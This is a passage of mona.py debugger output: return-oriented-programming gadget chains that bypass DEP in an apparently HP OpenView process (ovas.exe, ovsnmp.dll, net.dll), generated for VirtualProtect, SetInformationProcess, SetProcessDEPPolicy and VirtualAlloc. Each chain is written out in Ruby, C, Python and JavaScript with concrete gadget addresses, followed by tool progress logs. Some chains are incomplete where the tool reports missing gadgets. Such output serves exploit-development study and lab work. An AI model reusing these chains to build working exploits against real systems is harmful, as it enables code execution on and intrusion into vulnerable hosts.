                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x5a22a2a0,  # POP EBP # RETN [ovsnmp.dll] 
                0x5a21233d,  # & call esp [ovsnmp.dll]
                0x5a236375,  # POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x41414141,  # Filler (compensate)
                0x5a21d0f5,  # POP EDX # POP EDI # POP ESI # POP EBP # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> edx
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a236393,  # POP ECX # RETN [ovsnmp.dll] 
                0x5a2497ec,  # &Writable location [ovsnmp.dll]
                0x5a20c2a8,  # POP EDI # RETN [ovsnmp.dll] 
                0x5a2363bd,  # RETN (ROP NOP) [ovsnmp.dll]
                0x5a2362d9,  # POP EAX # RETN 0x0C [ovsnmp.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
              "%ua2a0%u5a22" + // 0x5a22a2a0 : ,# POP EBP # RETN [ovsnmp.dll] 
              "%u233d%u5a21" + // 0x5a21233d : ,# & call esp [ovsnmp.dll]
              "%u6375%u5a23" + // 0x5a236375 : ,# POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%ud0f5%u5a21" + // 0x5a21d0f5 : ,# POP EDX # POP EDI # POP ESI # POP EBP # RETN [ovsnmp.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u6393%u5a23" + // 0x5a236393 : ,# POP ECX # RETN [ovsnmp.dll] 
              "%u97ec%u5a24" + // 0x5a2497ec : ,# &Writable location [ovsnmp.dll]
              "%uc2a8%u5a20" + // 0x5a20c2a8 : ,# POP EDI # RETN [ovsnmp.dll] 
              "%u63bd%u5a23" + // 0x5a2363bd : ,# RETN (ROP NOP) [ovsnmp.dll]
              "%u62d9%u5a23" + // 0x5a2362d9 : ,# POP EAX # RETN 0x0C [ovsnmp.dll] 
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find API pointer -> ebp+c
                0x5a23374e,  # MOV EAX,DWORD PTR SS:[EBP+C] # POP EBP # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (compensate)
                0x5a211217,  # PUSH EAX # MOV DWORD PTR DS:[EDX],ECX # POP EBP # RETN [ovsnmp.dll] 
                0x5a208210,  # POP EDX # ADD ESP,4 # POP EBP # RETN [ovsnmp.dll] 
                0x00000022,  # 0x00000022-> edx
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a236393,  # POP ECX # RETN [ovsnmp.dll] 
                0x5a23731c,  # &0x00000002 [ovsnmp.dll]
                0x5a236375,  # POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x41414141,  # Filler (compensate)
                0x5a2363da,  # POP EAX # RETN 0x0C [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000004,  # 0x00000004-> eax
                0x5a20c2a8,  # POP EDI # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a20c2a8,  # skip 4 bytes [ovsnmp.dll]
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find API pointer -> ebp+c
                0x5a23374e,  // MOV EAX,DWORD PTR SS:[EBP+C] // POP EBP // RETN [ovsnmp.dll] 
                0x41414141,  // Filler (compensate)
                0x5a211217,  // PUSH EAX // MOV DWORD PTR DS:[EDX],ECX // POP EBP // RETN [ovsnmp.dll] 
                0x5a208210,  // POP EDX // ADD ESP,4 // POP EBP // RETN [ovsnmp.dll] 
                0x00000022,  // 0x00000022-> edx
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a236393,  // POP ECX // RETN [ovsnmp.dll] 
                0x5a23731c,  // &0x00000002 [ovsnmp.dll]
                0x5a236375,  // POP EBX // POP EBP // RETN 0x0C [ovsnmp.dll] 
                0xffffffff,  // 0xffffffff-> ebx
                0x41414141,  // Filler (compensate)
                0x5a2363da,  // POP EAX // RETN 0x0C [ovsnmp.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000004,  // 0x00000004-> eax
                0x5a20c2a8,  // POP EDI // RETN [ovsnmp.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a20c2a8,  // skip 4 bytes [ovsnmp.dll]
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find API pointer -> ebp+c
                0x5a23374e,  # MOV EAX,DWORD PTR SS:[EBP+C] # POP EBP # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (compensate)
                0x5a211217,  # PUSH EAX # MOV DWORD PTR DS:[EDX],ECX # POP EBP # RETN [ovsnmp.dll] 
                0x5a208210,  # POP EDX # ADD ESP,4 # POP EBP # RETN [ovsnmp.dll] 
                0x00000022,  # 0x00000022-> edx
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a236393,  # POP ECX # RETN [ovsnmp.dll] 
                0x5a23731c,  # &0x00000002 [ovsnmp.dll]
                0x5a236375,  # POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x41414141,  # Filler (compensate)
                0x5a2363da,  # POP EAX # RETN 0x0C [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000004,  # 0x00000004-> eax
                0x5a20c2a8,  # POP EDI # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a20c2a8,  # skip 4 bytes [ovsnmp.dll]
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> ebp+c
              "%u374e%u5a23" + // 0x5a23374e : ,# MOV EAX,DWORD PTR SS:[EBP+C] # POP EBP # RETN [ovsnmp.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u1217%u5a21" + // 0x5a211217 : ,# PUSH EAX # MOV DWORD PTR DS:[EDX],ECX # POP EBP # RETN [ovsnmp.dll] 
              "%u8210%u5a20" + // 0x5a208210 : ,# POP EDX # ADD ESP,4 # POP EBP # RETN [ovsnmp.dll] 
              "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u6393%u5a23" + // 0x5a236393 : ,# POP ECX # RETN [ovsnmp.dll] 
              "%u731c%u5a23" + // 0x5a23731c : ,# &0x00000002 [ovsnmp.dll]
              "%u6375%u5a23" + // 0x5a236375 : ,# POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u63da%u5a23" + // 0x5a2363da : ,# POP EAX # RETN 0x0C [ovsnmp.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%uc2a8%u5a20" + // 0x5a20c2a8 : ,# POP EDI # RETN [ovsnmp.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%uc2a8%u5a20" + // 0x5a20c2a8 : ,# skip 4 bytes [ovsnmp.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x5a236375,  # POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
                0x5a23700c,  # &0x00000000 [ovsnmp.dll]
                0x41414141,  # Filler (compensate)
                0x5a20c2a8,  # POP EDI # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a20c2a8,  # skip 4 bytes [ovsnmp.dll]
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x5a236375,  // POP EBX // POP EBP // RETN 0x0C [ovsnmp.dll] 
                0x5a23700c,  // &0x00000000 [ovsnmp.dll]
                0x41414141,  // Filler (compensate)
                0x5a20c2a8,  // POP EDI // RETN [ovsnmp.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a20c2a8,  // skip 4 bytes [ovsnmp.dll]
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x5a236375,  # POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
                0x5a23700c,  # &0x00000000 [ovsnmp.dll]
                0x41414141,  # Filler (compensate)
                0x5a20c2a8,  # POP EDI # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a20c2a8,  # skip 4 bytes [ovsnmp.dll]
                0x00000000,  # [-] Unable to find pushad gadget
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%u6375%u5a23" + // 0x5a236375 : ,# POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
              "%u700c%u5a23" + // 0x5a23700c : ,# &0x00000000 [ovsnmp.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%uc2a8%u5a20" + // 0x5a20c2a8 : ,# POP EDI # RETN [ovsnmp.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%uc2a8%u5a20" + // 0x5a20c2a8 : ,# skip 4 bytes [ovsnmp.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x5a208741,  # POP EBP # RETN [ovsnmp.dll] 
                0x5a21233d,  # & call esp [ovsnmp.dll]
                0x5a236375,  # POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x41414141,  # Filler (compensate)
                0x5a216f5a,  # POP EDX # ADD ESP,4 # POP EBP # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00001000,  # 0x00001000-> edx
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a236393,  # POP ECX # RETN [ovsnmp.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x5a20c2a8,  # POP EDI # RETN [ovsnmp.dll] 
                0x5a2363bd,  # RETN (ROP NOP) [ovsnmp.dll]
                0x5a2363da,  # POP EAX # RETN 0x0C [ovsnmp.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x5a208741,  // POP EBP // RETN [ovsnmp.dll] 
                0x5a21233d,  // & call esp [ovsnmp.dll]
                0x5a236375,  // POP EBX // POP EBP // RETN 0x0C [ovsnmp.dll] 
                0x00000001,  // 0x00000001-> ebx
                0x41414141,  // Filler (compensate)
                0x5a216f5a,  // POP EDX // ADD ESP,4 // POP EBP // RETN [ovsnmp.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00001000,  // 0x00001000-> edx
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a236393,  // POP ECX // RETN [ovsnmp.dll] 
                0x00000040,  // 0x00000040-> ecx
                0x5a20c2a8,  // POP EDI // RETN [ovsnmp.dll] 
                0x5a2363bd,  // RETN (ROP NOP) [ovsnmp.dll]
                0x5a2363da,  // POP EAX // RETN 0x0C [ovsnmp.dll] 
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x5a208741,  # POP EBP # RETN [ovsnmp.dll] 
                0x5a21233d,  # & call esp [ovsnmp.dll]
                0x5a236375,  # POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x41414141,  # Filler (compensate)
                0x5a216f5a,  # POP EDX # ADD ESP,4 # POP EBP # RETN [ovsnmp.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00001000,  # 0x00001000-> edx
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a236393,  # POP ECX # RETN [ovsnmp.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x5a20c2a8,  # POP EDI # RETN [ovsnmp.dll] 
                0x5a2363bd,  # RETN (ROP NOP) [ovsnmp.dll]
                0x5a2363da,  # POP EAX # RETN 0x0C [ovsnmp.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find gadgets to pickup the desired API pointer into esi
              "%u408c%u6d1d" + // 0x6d1d408c : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
              "%u8741%u5a20" + // 0x5a208741 : ,# POP EBP # RETN [ovsnmp.dll] 
              "%u233d%u5a21" + // 0x5a21233d : ,# & call esp [ovsnmp.dll]
              "%u6375%u5a23" + // 0x5a236375 : ,# POP EBX # POP EBP # RETN 0x0C [ovsnmp.dll] 
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u6f5a%u5a21" + // 0x5a216f5a : ,# POP EDX # ADD ESP,4 # POP EBP # RETN [ovsnmp.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u6393%u5a23" + // 0x5a236393 : ,# POP ECX # RETN [ovsnmp.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%uc2a8%u5a20" + // 0x5a20c2a8 : ,# POP EDI # RETN [ovsnmp.dll] 
              "%u63bd%u5a23" + // 0x5a2363bd : ,# RETN (ROP NOP) [ovsnmp.dll]
              "%u63da%u5a23" + // 0x5a2363da : ,# POP EAX # RETN 0x0C [ovsnmp.dll] 
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 193 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 75 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (1158 interesting gadgets)
0BADF00D      Wrote 1158 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (4357 gadgets)
0BADF00D      Wrote 4357 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:00:24.875000
0BADF00D  [+] Command used:
0BADF00D  !mona rop -m net.dll
          
          ---------- Mona command started on 2018-10-30 04:48:54 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules net.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module net.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x0C, Nr found : 25
0BADF00D         Ending : RETN 0x1C, Nr found : 1
0BADF00D         Ending : RETN, Nr found : 85
0BADF00D         Ending : RETN 0x18, Nr found : 1
0BADF00D         Ending : RETN 0x08, Nr found : 20
0BADF00D         Ending : RETN 0x10, Nr found : 7
0BADF00D         Ending : RETN 0x00, Nr found : 2
0BADF00D         Ending : RETN 0x14, Nr found : 4
0BADF00D      - Filtering and mutating 145 gadgets
0BADF00D        - Progress update : 100 / 145 items processed (Tue 2018/10/30 04:49:09 AM) - (68%)
0BADF00D        - Progress update : 145 / 145 items processed (Tue 2018/10/30 04:49:09 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:49:09 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x6d2d0000 to 0x6d2dd000
0BADF00D      Tue 2018/10/30 04:49:10 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:49:10 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:49:10 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:49:10 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:49:10 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:49:10 AM: Step 7/7: eax
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:49:10 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:49:11 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:49:11 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:49:11 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:49:11 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:49:11 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:49:11 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:49:12 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:49:12 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:49:12 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x6d2d0000 to 0x6d2dd000
0BADF00D      Tue 2018/10/30 04:49:14 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:49:14 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:49:14 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:49:14 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:49:14 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:49:14 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
